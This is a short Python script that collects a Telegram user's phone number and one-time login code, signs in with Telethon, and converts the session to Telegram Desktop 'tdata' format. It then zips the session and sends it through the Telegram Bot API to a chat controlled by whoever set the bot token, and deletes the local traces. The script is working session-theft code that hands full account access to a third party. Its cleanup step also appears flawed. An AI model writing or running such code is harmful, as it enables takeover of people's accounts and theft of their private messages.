import os
import zipfile
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from opentele.td import TDesktop
from opentele.api import API, UseCurrentSession
import asyncio
import requests

# Replace with your Telegram bot token and chat ID
bot_token = 'YOUR_BOT_TOKEN'
chat_id = 'YOUR_CHAT_ID'

async def main():
    # Prompt the user for their phone number
    phone = input("Enter your phone number with country code (e.g., +91): ")

    # Initialize the Telegram client
    client = TelegramClient(StringSession(), "YOUR_API_ID", "YOUR_API_HASH")
    
    # Start the client and prompt for OTP
    await client.start(phone)
    await client.sign_in(phone, input("Enter the OTP you received: "))

    # Convert the logged-in session to Telegram Desktop's `.tdata` format
    tdesk = await client.ToTDesktop(flag=UseCurrentSession)
    
    # Save the session to a folder named "tdata"
    tdata_dir = 'tdata'
    tdesk.SaveTData(tdata_dir)

    # Zip the tdata directory for easy sending
    tdata_zip = 'tdata.zip'
    with zipfile.ZipFile(tdata_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(tdata_dir):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), tdata_dir))

    # Send the zipped tdata file to a specified chat via Telegram bot
    with open(tdata_zip, 'rb') as f:
        response = requests.post(
            f'https://api.telegram.org/bot{bot_token}/sendDocument',
            data={'chat_id': chat_id},
            files={'document': f}
        )
        print(response.json())

    # Clean up: remove the zip file and the tdata directory
    os.remove(tdata_zip)
    os.rmdir(tdata_dir)

    print(f"Session saved as {tdata_zip} and sent to chat ID {chat_id}.")

# Run the script
asyncio.run(main())